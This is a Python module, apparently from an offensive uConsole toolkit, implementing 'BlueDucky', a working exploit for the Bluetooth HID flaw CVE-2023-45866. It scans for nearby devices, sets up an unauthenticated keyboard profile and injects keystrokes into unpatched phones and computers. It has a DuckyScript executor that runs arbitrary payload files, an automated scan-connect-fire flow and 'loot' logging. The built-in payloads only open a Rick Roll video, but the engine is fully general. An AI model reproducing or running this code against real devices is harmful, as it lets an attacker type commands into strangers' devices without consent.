"""BlueDucky — BLE HID keystroke injection via Classic Bluetooth (CVE-2023-45866).

Exploits unauthenticated Bluetooth HID pairing to inject keystrokes into
nearby devices.  Runs entirely on the uConsole (pybluez + D-Bus), does NOT
use the ESP32 serial link.

Requirements:
  - BlueZ 5.x with bluetoothd running
  - pybluez (``import bluetooth``)
  - dbus-python (``import dbus``)
  - Root privileges (for L2CAP raw sockets)
"""

import os
import re
import threading
import time
from pathlib import Path

import urwid

from ...app_state import AppState
from ...loot_manager import LootManager
from ..widgets.log_viewer import LogViewer
from ..widgets.confirm_dialog import ConfirmDialog
from ..widgets.text_input_dialog import TextInputDialog
from ..widgets.list_picker import ListPickerDialog

# ---------------------------------------------------------------------------
# HID keycodes  (USB HID Usage Table — Keyboard/Keypad page 0x07)
# ---------------------------------------------------------------------------

_MOD_NONE = 0x00
_MOD_LCTRL = 0x01
_MOD_LSHIFT = 0x02
_MOD_LALT = 0x04
_MOD_LGUI = 0x08   # Windows / Super / Cmd
_MOD_RCTRL = 0x10
_MOD_RSHIFT = 0x20
_MOD_RALT = 0x40
_MOD_RGUI = 0x80

_KEY_ENTER = 0x28
_KEY_ESCAPE = 0x29
_KEY_BACKSPACE = 0x2A
_KEY_TAB = 0x2B
_KEY_SPACE = 0x2C
_KEY_DELETE = 0x4C
_KEY_RIGHT = 0x4F
_KEY_LEFT = 0x50
_KEY_DOWN = 0x51
_KEY_UP = 0x52
_KEY_F1 = 0x3A
_KEY_CAPSLOCK = 0x39

# ASCII printable → (keycode, needs_shift)
_ASCII_MAP: dict[str, tuple[int, bool]] = {}

def _init_ascii_map() -> None:
    _lower = "abcdefghijklmnopqrstuvwxyz"
    for i, ch in enumerate(_lower):
        _ASCII_MAP[ch] = (0x04 + i, False)
        _ASCII_MAP[ch.upper()] = (0x04 + i, True)
    _digits = "1234567890"
    _digit_keys = [0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27]
    for i, ch in enumerate(_digits):
        _ASCII_MAP[ch] = (_digit_keys[i], False)
    _sym_noshift = {
        " ": 0x2C, "-": 0x2D, "=": 0x2E, "[": 0x2F, "]": 0x30,
        "\\": 0x31, ";": 0x33, "'": 0x34, "`": 0x35, ",": 0x36,
        ".": 0x37, "/": 0x38,
    }
    for ch, kc in _sym_noshift.items():
        _ASCII_MAP[ch] = (kc, False)
    _sym_shift = {
        "!": 0x1E, "@": 0x1F, "#": 0x20, "$": 0x21, "%": 0x22,
        "^": 0x23, "&": 0x24, "*": 0x25, "(": 0x26, ")": 0x27,
        "_": 0x2D, "+": 0x2E, "{": 0x2F, "}": 0x30, "|": 0x31,
        ":": 0x33, '"': 0x34, "~": 0x35, "<": 0x36, ">": 0x37,
        "?": 0x38,
    }
    for ch, kc in _sym_shift.items():
        _ASCII_MAP[ch] = (kc, True)

_init_ascii_map()

# Named keys for DuckyScript
_NAMED_KEYS: dict[str, int] = {
    "ENTER": _KEY_ENTER, "RETURN": _KEY_ENTER,
    "ESCAPE": _KEY_ESCAPE, "ESC": _KEY_ESCAPE,
    "BACKSPACE": _KEY_BACKSPACE, "DELETE": _KEY_DELETE,
    "TAB": _KEY_TAB, "SPACE": _KEY_SPACE,
    "UP": _KEY_UP, "DOWN": _KEY_DOWN,
    "LEFT": _KEY_LEFT, "RIGHT": _KEY_RIGHT,
    "CAPSLOCK": _KEY_CAPSLOCK,
    "F1": 0x3A, "F2": 0x3B, "F3": 0x3C, "F4": 0x3D,
    "F5": 0x3E, "F6": 0x3F, "F7": 0x40, "F8": 0x41,
    "F9": 0x42, "F10": 0x43, "F11": 0x44, "F12": 0x45,
}

# Modifier name → bit
_MOD_NAMES: dict[str, int] = {
    "CTRL": _MOD_LCTRL, "CONTROL": _MOD_LCTRL,
    "SHIFT": _MOD_LSHIFT,
    "ALT": _MOD_LALT,
    "GUI": _MOD_LGUI, "WINDOWS": _MOD_LGUI, "SUPER": _MOD_LGUI, "META": _MOD_LGUI,
}

# ---------------------------------------------------------------------------
# SDP record XML for HID Keyboard profile
# ---------------------------------------------------------------------------

_SDP_RECORD_XML = """<?xml version="1.0" encoding="UTF-8" ?>
<record>
  <attribute id="0x0001">
    <sequence>
      <uuid value="0x1124"/>
    </sequence>
  </attribute>
  <attribute id="0x0004">
    <sequence>
      <sequence>
        <uuid value="0x0100"/>
        <uint16 value="0x0011"/>
      </sequence>
      <sequence>
        <uuid value="0x0011"/>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x0005">
    <sequence>
      <uuid value="0x1002"/>
    </sequence>
  </attribute>
  <attribute id="0x0006">
    <sequence>
      <uint16 value="0x656e"/>
      <uint16 value="0x006a"/>
      <uint16 value="0x0100"/>
    </sequence>
  </attribute>
  <attribute id="0x0009">
    <sequence>
      <sequence>
        <uuid value="0x1124"/>
        <uint16 value="0x0100"/>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x000d">
    <sequence>
      <sequence>
        <sequence>
          <uuid value="0x0100"/>
          <uint16 value="0x0013"/>
        </sequence>
        <sequence>
          <uuid value="0x0011"/>
        </sequence>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x0100">
    <text value="Keyboard"/>
  </attribute>
  <attribute id="0x0101">
    <text value="Bluetooth HID Keyboard"/>
  </attribute>
  <attribute id="0x0102">
    <text value=""/>
  </attribute>
  <attribute id="0x0200">
    <uint16 value="0x0100"/>
  </attribute>
  <attribute id="0x0201">
    <uint16 value="0x0111"/>
  </attribute>
  <attribute id="0x0202">
    <uint8 value="0x40"/>
  </attribute>
  <attribute id="0x0203">
    <uint8 value="0x00"/>
  </attribute>
  <attribute id="0x0204">
    <boolean value="true"/>
  </attribute>
  <attribute id="0x0205">
    <boolean value="true"/>
  </attribute>
  <attribute id="0x0206">
    <sequence>
      <sequence>
        <uint8 value="0x22"/>
        <text encoding="hex" value="05010906a101850175019508050719e029e715002501810295017508810395057501050819012905910295017503910195067508150026ff000507190029ff8100c0"/>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x0207">
    <sequence>
      <sequence>
        <uint16 value="0x0409"/>
        <uint16 value="0x0100"/>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x020b">
    <uint16 value="0x0100"/>
  </attribute>
  <attribute id="0x020c">
    <uint16 value="0x0c80"/>
  </attribute>
  <attribute id="0x020d">
    <boolean value="true"/>
  </attribute>
  <attribute id="0x020e">
    <boolean value="true"/>
  </attribute>
</record>
"""

# ---------------------------------------------------------------------------
# L2CAP HID Client
# ---------------------------------------------------------------------------

class L2CAPHIDClient:
    """Manages Classic BT L2CAP connections for HID injection."""

    PSM_SDP = 1
    PSM_CTRL = 17
    PSM_INTR = 19

    def __init__(self) -> None:
        self._ctrl_sock = None
        self._intr_sock = None
        self._connected = False

    @property
    def connected(self) -> bool:
        return self._connected

    def connect(self, target_addr: str, timeout: float = 10.0) -> None:
        """Connect L2CAP sockets to target device."""
        import bluetooth

        self._ctrl_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        self._intr_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)

        self._ctrl_sock.settimeout(timeout)
        self._intr_sock.settimeout(timeout)

        self._ctrl_sock.connect((target_addr, self.PSM_CTRL))
        self._intr_sock.connect((target_addr, self.PSM_INTR))
        self._connected = True

    def close(self) -> None:
        for sock in (self._intr_sock, self._ctrl_sock):
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        self._ctrl_sock = None
        self._intr_sock = None
        self._connected = False

    def send_key(self, modifier: int, keycode: int) -> None:
        """Send HID key press + release report."""
        if not self._connected or not self._intr_sock:
            return
        # Key press: 0xa1 = DATA | input, Report ID 0x01
        report = bytes([0xa1, 0x01, modifier, 0x00, keycode, 0, 0, 0, 0, 0])
        self._intr_sock.send(report)
        time.sleep(0.004)
        # Key release
        release = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0])
        self._intr_sock.send(release)
        time.sleep(0.02)

    def send_string(self, text: str) -> int:
        """Type a string character by character. Returns count of keys sent."""
        count = 0
        for ch in text:
            if ch == "\n":
                self.send_key(_MOD_NONE, _KEY_ENTER)
                count += 1
            elif ch == "\t":
                self.send_key(_MOD_NONE, _KEY_TAB)
                count += 1
            elif ch in _ASCII_MAP:
                kc, shift = _ASCII_MAP[ch]
                mod = _MOD_LSHIFT if shift else _MOD_NONE
                self.send_key(mod, kc)
                count += 1
        return count


# ---------------------------------------------------------------------------
# DuckyScript parser
# ---------------------------------------------------------------------------

def parse_duckyscript(script: str) -> list[tuple[str, str]]:
    """Parse DuckyScript text into list of (command, argument) tuples."""
    commands: list[tuple[str, str]] = []
    for raw_line in script.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("REM ") or line.startswith("//"):
            continue
        parts = line.split(None, 1)
        cmd = parts[0].upper()
        arg = parts[1] if len(parts) > 1 else ""
        commands.append((cmd, arg))
    return commands


def execute_duckyscript(client: L2CAPHIDClient, commands: list[tuple[str, str]],
                        log_fn=None, stop_check=None) -> int:
    """Execute parsed DuckyScript commands. Returns total keys sent."""
    total = 0
    for cmd, arg in commands:
        if stop_check and stop_check():
            break

        if cmd == "STRING":
            n = client.send_string(arg)
            total += n
            if log_fn:
                log_fn(f"  STRING: {arg[:40]}{'...' if len(arg) > 40 else ''} ({n} keys)")

        elif cmd == "DELAY":
            try:
                ms = int(arg)
            except ValueError:
                ms = 100
            time.sleep(ms / 1000.0)
            if log_fn:
                log_fn(f"  DELAY {ms}ms")

        elif cmd == "ENTER" or cmd == "RETURN":
            client.send_key(_MOD_NONE, _KEY_ENTER)
            total += 1

        elif cmd == "TAB":
            client.send_key(_MOD_NONE, _KEY_TAB)
            total += 1

        elif cmd == "ESCAPE" or cmd == "ESC":
            client.send_key(_MOD_NONE, _KEY_ESCAPE)
            total += 1

        elif cmd == "BACKSPACE":
            client.send_key(_MOD_NONE, _KEY_BACKSPACE)
            total += 1

        elif cmd == "DELETE":
            client.send_key(_MOD_NONE, _KEY_DELETE)
            total += 1

        elif cmd == "SPACE":
            client.send_key(_MOD_NONE, _KEY_SPACE)
            total += 1

        elif cmd in ("UP", "DOWN", "LEFT", "RIGHT"):
            client.send_key(_MOD_NONE, _NAMED_KEYS[cmd])
            total += 1

        elif cmd in ("F1", "F2", "F3", "F4", "F5", "F6",
                      "F7", "F8", "F9", "F10", "F11", "F12"):
            client.send_key(_MOD_NONE, _NAMED_KEYS[cmd])
            total += 1

        elif cmd in _MOD_NAMES:
            # Modifier + key combo: GUI b, CTRL l, ALT ESCAPE, SHIFT a
            mod_bit = _MOD_NAMES[cmd]
            if arg:
                arg_upper = arg.strip().upper()
                if arg_upper in _NAMED_KEYS:
                    client.send_key(mod_bit, _NAMED_KEYS[arg_upper])
                elif len(arg.strip()) == 1 and arg.strip() in _ASCII_MAP:
                    kc, shift = _ASCII_MAP[arg.strip()]
                    mod = mod_bit | (_MOD_LSHIFT if shift else 0)
                    client.send_key(mod, kc)
                else:
                    # Try lowercase
                    ch = arg.strip().lower()
                    if ch in _ASCII_MAP:
                        kc, _ = _ASCII_MAP[ch]
                        client.send_key(mod_bit, kc)
            total += 1

        elif cmd == "PRIVATE_BROWSER" or cmd == "BROWSER":
            # Ctrl+Shift+N (incognito)
            client.send_key(_MOD_LCTRL | _MOD_LSHIFT, _NAMED_KEYS.get("N", 0x11))
            total += 1

    return total


# ---------------------------------------------------------------------------
# Built-in payloads
# ---------------------------------------------------------------------------

RICKROLL_PAYLOAD = """REM Rick Roll — opens YouTube on Android
DELAY 500
ESCAPE
DELAY 200
GUI d
DELAY 500
GUI b
DELAY 1000
CTRL l
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
DELAY 300
ENTER
"""

HELLO_PAYLOAD = """REM Simple hello test
DELAY 500
GUI d
DELAY 300
GUI b
DELAY 1000
CTRL l
DELAY 300
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
DELAY 200
ENTER
"""

BUILTIN_PAYLOADS = {
    "Rick Roll (YouTube)": RICKROLL_PAYLOAD,
    "Hello Test": HELLO_PAYLOAD,
}


# ---------------------------------------------------------------------------
# BlueZ D-Bus helpers
# ---------------------------------------------------------------------------

def _setup_bluetooth_adapter(log_fn=None) -> bool:
    """Configure BlueZ adapter for HID injection via D-Bus."""
    try:
        import dbus

        bus = dbus.SystemBus()
        adapter_path = "/org/bluez/hci0"
        adapter = dbus.Interface(
            bus.get_object("org.bluez", adapter_path),
            "org.freedesktop.DBus.Properties",
        )

        # Power on
        adapter.Set("org.bluez.Adapter1", "Powered", dbus.Boolean(True))
        # Set name
        adapter.Set("org.bluez.Adapter1", "Alias", dbus.String("BLE Keyboard"))

        # Set device class to Keyboard (0x002540)
        os.system("hciconfig hci0 class 0x002540 >/dev/null 2>&1")

        # Disable SSP for NoInputNoOutput pairing
        os.system("btmgmt ssp off >/dev/null 2>&1")
        os.system("btmgmt connectable on >/dev/null 2>&1")
        os.system("btmgmt bondable on >/dev/null 2>&1")
        os.system("btmgmt io-cap 3 >/dev/null 2>&1")  # NoInputNoOutput

        if log_fn:
            log_fn("  Adapter configured: 'BLE Keyboard', class=Keyboard")
        return True
    except Exception as e:
        if log_fn:
            log_fn(f"  Adapter setup failed: {e}")
        return False


def _register_hid_profile(log_fn=None) -> bool:
    """Register HID profile via D-Bus ProfileManager1."""
    try:
        import dbus

        bus = dbus.SystemBus()
        manager = dbus.Interface(
            bus.get_object("org.bluez", "/org/bluez"),
            "org.bluez.ProfileManager1",
        )

        opts = {
            "Role": dbus.String("server"),
            "RequireAuthentication": dbus.Boolean(False),
            "RequireAuthorization": dbus.Boolean(False),
            "AutoConnect": dbus.Boolean(True),
            "ServiceRecord": dbus.String(_SDP_RECORD_XML),
        }

        manager.RegisterProfile(
            dbus.ObjectPath("/org/bluez/hid"),
            "00001124-0000-1000-8000-00805f9b34fb",  # HID UUID
            opts,
        )

        if log_fn:
            log_fn("  HID profile registered")
        return True
    except Exception as e:
        if log_fn:
            log_fn(f"  HID profile registration: {e}")
        # May already be registered — treat as non-fatal
        return True


def _scan_bt_devices(duration: int = 10, log_fn=None) -> list[tuple[str, str]]:
    """Scan for nearby Bluetooth devices. Returns [(addr, name), ...]."""
    try:
        import bluetooth
        if log_fn:
            log_fn(f"  Scanning for {duration}s...")
        devices = bluetooth.discover_devices(
            duration=duration,
            lookup_names=True,
            flush_cache=True,
            lookup_class=False,
        )
        return [(addr, name) for addr, name in devices]
    except Exception as e:
        if log_fn:
            log_fn(f"  Scan failed: {e}")
        return []


# ---------------------------------------------------------------------------
# TUI Screen
# ---------------------------------------------------------------------------

class BlueDuckyScreen(urwid.WidgetWrap):
    """Sub-screen for BlueDucky BLE HID keystroke injection.

    Keys:
      [s] Scan for targets
      [c] Connect to target (manual MAC)
      [p] Pick payload + execute
      [r] Rick Roll (quick)
      [x] Stop / disconnect
      [esc] Back to attacks menu
    """

    def __init__(self, state: AppState, app,
                 loot: LootManager | None = None) -> None:
        self.state = state
        self._app = app
        self._loot = loot

        self._running = False
        self._thread: threading.Thread | None = None
        self._client = L2CAPHIDClient()
        self._target_addr = ""
        self._target_name = ""
        self._scanned_devices: list[tuple[str, str]] = []
        self._keys_sent = 0

        self._log = LogViewer(max_lines=200)
        self._status = urwid.Text(("dim", "  [s]Scan  [c]Connect  [r]RickRoll(auto)  [p]Payload  [x]Stop  [esc]Back"))
        self._info = urwid.Text(("warning", "  BlueDucky — idle"))

        self._idle_view = urwid.ListBox(urwid.SimpleFocusListWalker([
            urwid.Text(("default",
                        "  BlueDucky — BT HID Injection (CVE-2023-45866)\n\n"
                        "  Injects keystrokes via Classic Bluetooth L2CAP.\n"
                        "  No pairing needed on UNPATCHED devices:\n"
                        "    - Android before Dec 2023 security patch\n"
                        "    - macOS/iOS before Dec 2023 update\n"
                        "    - Linux with unpatched BlueZ\n"
                        "    - Windows before Jan 2024 patch\n\n"
                        "  Uses uConsole's built-in Bluetooth adapter.\n\n"
                        "  [s] Scan for BT devices\n"
                        "  [c] Connect (enter MAC manually)\n"
                        "  [r] Rick Roll (auto: scan → pick → connect → play)\n"
                        "  [p] Pick DuckyScript payload\n"
                        "  [x] Stop / disconnect\n")),
        ]))
        self._body = urwid.WidgetPlaceholder(self._idle_view)

        self._pile = urwid.Pile([
            ("pack", self._info),
            ("pack", urwid.Divider("─")),
            self._body,
            ("pack", urwid.Divider("─")),
            ("pack", self._status),
        ])
        super().__init__(self._pile)

    def selectable(self):
        return True

    # ------------------------------------------------------------------
    # refresh
    # ------------------------------------------------------------------

    def refresh(self) -> None:
        if self._client.connected:
            self._info.set_text(
                ("attack_active",
                 f"  BlueDucky — CONNECTED to {self._target_addr} ({self._target_name})  Keys:{self._keys_sent}")
            )
        elif self._running:
            self._info.set_text(("warning", "  BlueDucky — working..."))
        else:
            self._info.set_text(("warning", "  BlueDucky — idle"))

    # ------------------------------------------------------------------
    # Scan
    # ------------------------------------------------------------------

    def _do_scan(self) -> None:
        self._running = True
        self._log.append(">>> Scanning for Bluetooth devices...", "attack_active")

        def _scan_thread():
            devices = _scan_bt_devices(duration=8, log_fn=lambda m: self._log.append(m, "dim"))
            self._scanned_devices = devices
            self._running = False
            if not devices:
                self._log.append("  No devices found", "warning")
                return
            self._log.append(f"  Found {len(devices)} device(s):", "success")
            for i, (addr, name) in enumerate(devices):
                self._log.append(f"  {i+1}. {addr}  {name or '(unknown)'}", "default")
            self._log.append("  Press [c] to connect or [1-9] to select", "dim")

        self._thread = threading.Thread(target=_scan_thread, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Connect
    # ------------------------------------------------------------------

    def _do_connect(self, addr: str, name: str = "",
                    on_connected=None) -> None:
        """Connect to target. If on_connected is set, call it after success."""
        self._target_addr = addr
        self._target_name = name or addr
        self._running = True
        self._log.append(f">>> Connecting to {addr}...", "attack_active")
        self._log.append("  Setting up adapter (may take ~10s)...", "dim")

        def _connect_thread():
            try:
                if not _setup_bluetooth_adapter(log_fn=lambda m: self._log.append(m, "dim")):
                    self._log.append("  Failed to setup adapter", "error")
                    self._running = False
                    return

                _register_hid_profile(log_fn=lambda m: self._log.append(m, "dim"))

                self._log.append(f"  Opening L2CAP to {addr} (timeout 10s)...", "dim")
                self._client.connect(addr, timeout=10.0)
                self._log.append(f"  Connected to {addr}!", "success")
                self.state.bt_ducky_running = True
                if self._loot:
                    self._loot.log_attack_event(f"BLUEDUCKY: Connected to {addr}")

                if on_connected:
                    # Don't clear _running here — callback may start its own work
                    on_connected()
                    return
                else:
                    self._log.append("  Press [r] for Rick Roll or [p] for payload", "dim")
            except (TimeoutError, OSError) as e:
                err_str = str(e)
                self._log.append(f"  Connection failed: {err_str}", "error")
                if "timed out" in err_str.lower():
                    self._log.append("  Target may be patched (CVE-2023-45866)", "warning")
                    self._log.append("  Works on: Android <Dec 2023, unpatched Linux/macOS", "dim")
                self._client.close()
            except Exception as e:
                self._log.append(f"  Connection failed: {e}", "error")
                self._client.close()
            finally:
                self._running = False

        self._thread = threading.Thread(target=_connect_thread, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Execute payload
    # ------------------------------------------------------------------

    def _do_payload(self, script: str, name: str = "payload") -> None:
        if not self._client.connected:
            self._log.append("  Not connected — connect first", "error")
            return

        self._running = True
        self._log.append(f">>> Executing: {name}", "attack_active")

        def _payload_thread():
            try:
                commands = parse_duckyscript(script)
                count = execute_duckyscript(
                    self._client, commands,
                    log_fn=lambda m: self._log.append(m, "dim"),
                    stop_check=lambda: not self._running,
                )
                self._keys_sent += count
                self._log.append(f"  Done! Sent {count} keystrokes", "success")
                if self._loot:
                    self._loot.log_attack_event(f"BLUEDUCKY: {name} — {count} keys to {self._target_addr}")
            except Exception as e:
                self._log.append(f"  Payload error: {e}", "error")
            finally:
                self._running = False

        self._thread = threading.Thread(target=_payload_thread, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Rick Roll auto-flow: scan → pick → connect → payload
    # ------------------------------------------------------------------

    def _do_rickroll_auto(self) -> None:
        """Full auto: scan → show picker → connect → execute Rick Roll."""
        if self._client.connected:
            # Already connected — just run the payload
            self._do_payload(RICKROLL_PAYLOAD, "Rick Roll")
            return

        self._running = True
        self._body.original_widget = self._log
        self._log.append(">>> Rick Roll: scanning for targets...", "attack_active")

        def _scan_then_pick():
            devices = _scan_bt_devices(duration=8, log_fn=lambda m: self._log.append(m, "dim"))
            self._scanned_devices = devices
            self._running = False

            if not devices:
                self._log.append("  No devices found", "warning")
                return

            self._log.append(f"  Found {len(devices)} device(s):", "success")
            for i, (addr, name) in enumerate(devices):
                self._log.append(f"  {i+1}. {addr}  {name or '(unknown)'}", "default")

            # Show picker dialog on main thread
            choices = [f"{name or '(unknown)'}  {addr}" for addr, name in devices]

            def on_pick(idx):
                self._app.dismiss_overlay()
                if idx is None:
                    self._log.append("  Cancelled", "dim")
                    return
                addr, name = devices[idx]
                self._log.append(f"  Selected: {addr} ({name or '?'})", "default")

                def _fire_rickroll():
                    self._do_payload(RICKROLL_PAYLOAD, "Rick Roll")

                self._do_connect(addr, name, on_connected=_fire_rickroll)

            # Schedule dialog on main loop
            try:
                self._app._loop.set_alarm_in(0, lambda *_: self._app.show_overlay(
                    ListPickerDialog("Rick Roll target:", choices, on_pick),
                    55, min(len(choices) + 6, 16),
                ))
            except Exception:
                # Fallback: just prompt to press 1-9
                self._log.append("  Press [1-9] to select target, then [r] again", "dim")

        self._thread = threading.Thread(target=_scan_then_pick, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Stop
    # ------------------------------------------------------------------

    def _stop(self) -> None:
        self._running = False
        if self._client.connected:
            self._client.close()
            self._log.append(">>> Disconnected", "warning")
        self.state.bt_ducky_running = False
        self._keys_sent = 0

    # ------------------------------------------------------------------
    # Keypress handling
    # ------------------------------------------------------------------

    _PASSTHROUGH = object()

    def keypress(self, size, key):
        result = self._handle_key(key)
        if result is self._PASSTHROUGH:
            return self._pile.keypress(size, key)
        return result  # None = consumed, or key string = bubble up

    def _handle_key(self, key):
        if key == "s":
            if not self._running:
                self._body.original_widget = self._log
                self._do_scan()
            return None  # consumed

        if key == "c":
            def on_mac(text):
                if text is None:
                    self._app.dismiss_overlay()
                    return
                self._app.dismiss_overlay()
                mac = text.strip().upper()
                if not re.match(r'^[0-9A-F]{2}(:[0-9A-F]{2}){5}$', mac):
                    self._log.append("  Invalid MAC format", "error")
                    return
                self._do_connect(mac)

            dialog = TextInputDialog("Target BT MAC (XX:XX:XX:XX:XX:XX):", on_mac)
            self._app.show_overlay(dialog, 50, 7)
            return None

        # Quick-select from scan results (1-9)
        if key in "123456789" and self._scanned_devices:
            idx = int(key) - 1
            if idx < len(self._scanned_devices):
                addr, name = self._scanned_devices[idx]
                self._do_connect(addr, name)
                return None

        if key == "r":
            if not self._running:
                self._do_rickroll_auto()
            return None

        if key == "p":
            if not self._client.connected:
                self._log.append("  Connect first", "warning")
                return None

            choices = list(BUILTIN_PAYLOADS.keys())

            payload_dirs = [
                Path("/media/locosp/") / "payloads",
                Path.home() / "payloads",
                Path("/sdcard/payloads"),
            ]
            custom_files: list[Path] = []
            for d in payload_dirs:
                if d.is_dir():
                    custom_files.extend(sorted(d.glob("*.txt")))
            for f in custom_files:
                choices.append(f"[SD] {f.name}")

            def on_choice(idx):
                self._app.dismiss_overlay()
                if idx is None:
                    return
                if idx < len(BUILTIN_PAYLOADS):
                    name = list(BUILTIN_PAYLOADS.keys())[idx]
                    self._do_payload(BUILTIN_PAYLOADS[name], name)
                else:
                    file_idx = idx - len(BUILTIN_PAYLOADS)
                    if file_idx < len(custom_files):
                        fp = custom_files[file_idx]
                        try:
                            script = fp.read_text(encoding="utf-8")
                            self._do_payload(script, fp.name)
                        except Exception as e:
                            self._log.append(f"  Failed to read {fp}: {e}", "error")

            dialog = ListPickerDialog("Select payload:", choices, on_choice)
            self._app.show_overlay(dialog, 50, min(len(choices) + 6, 16))
            return None

        if key == "x":
            self._stop()
            return None

        if key == "esc":
            self._stop()
            return key  # bubble up to exit sub-screen

        return self._PASSTHROUGH
